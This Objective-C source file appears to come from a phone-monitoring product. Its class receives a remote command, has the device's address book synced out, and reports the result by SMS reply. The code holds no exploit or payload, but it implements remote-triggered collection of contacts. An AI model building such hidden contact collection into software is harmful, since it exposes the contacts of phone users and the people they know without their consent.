/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SyncAddressBookProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SyncAddressBookProcessor.h"
#import "AddressbookManager.h"

@interface SyncAddressBookProcessor (PrivateAPI)
- (void) processSyncAddressBook;
- (void) syncAddressBookException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end

@implementation SyncAddressBookProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the SyncAddressBookProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (SyncAddressBookProcessor).
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SyncAddressBookProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark SyncAddressBookProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SyncAddressBookProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SyncAddressBookProcessor--->doProcessingCommand")
	[self processSyncAddressBook];
}


#pragma mark SyncAddressBookProcessor Private Methods

/**
 - Method name: syncAddressBookException
 - Purpose:This method is used to process Sync AddressBook
 - Argument list and description: No Argument
 - Return description: No return type
*/


- (void) processSyncAddressBook {
	DLog (@"SyncAddressBookProcessor--->processSyncAddressBook")
	id <AddressbookManager> addressBookManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mAddressbookManager];
	BOOL isReady= [addressBookManager syncAddressbook:self];
	if (!isReady) {
		[self syncAddressBookException];
	}
	else {
		[self acknowldgeMessage];
	}
}


/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
*/

- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kSyncAddressBookSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"SyncAddressBookProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	DLog (@"recipientNumber %@", [self recipientNumber])
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when request sync address book process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
*/

-(void) processFinished {
	DLog (@"SyncAddressBookProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

/**
 - Method name: syncAddressBookException
 - Purpose:This method is invoked when  pr failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) syncAddressBookException {
	DLog (@"SyncAddressBookProcessor--->requestAddressBookException")
	FxException* exception = [FxException exceptionWithName:@"syncAddressBookException" andReason:@"Sync AddressBook error"];
	[exception setErrorCode:kAddressBookManagerBusy];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


#pragma mark AddressbookManager Delegate Methods

/**
 - Method name: abDeliverySucceeded
 - Purpose:This method is invoked when address book sync is completed
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) abDeliverySucceeded: (NSNumber *) aEDPType {
	DLog (@"abDeliverySucceeded >>>>>>")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *requestAddressBookMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSyncAddressBookSucessMSG2", @"")];
	
	// Remove processor from the array inside AddressBookManager
	[[[RemoteCmdUtils sharedRemoteCmdUtils] mAddressbookManager] removeAddressbookDeliveryDelegate:self];
	
   	[self sendReplySMS:requestAddressBookMessage isProcessCompleted:YES];
}

/**
 - Method name: abDeliveryFailed
 - Purpose:This method is invoked when addressbook delivery is failed
 - Argument list and description:aError(NSError*)
 - Return description: No return type
*/

- (void) abDeliveryFailed: (NSError *) aError {
	DLog (@"abDeliveryFailed >>>>>>")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:[aError code]];
	// Remove processor from the array inside AddressBookManager
	[[[RemoteCmdUtils sharedRemoteCmdUtils] mAddressbookManager] removeAddressbookDeliveryDelegate:self];
	
	[self sendReplySMS:messageFormat isProcessCompleted:YES];
}


/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	DLog (@"SyncAddressBookProcessor is now dealloced")
	[super dealloc];
}

@end
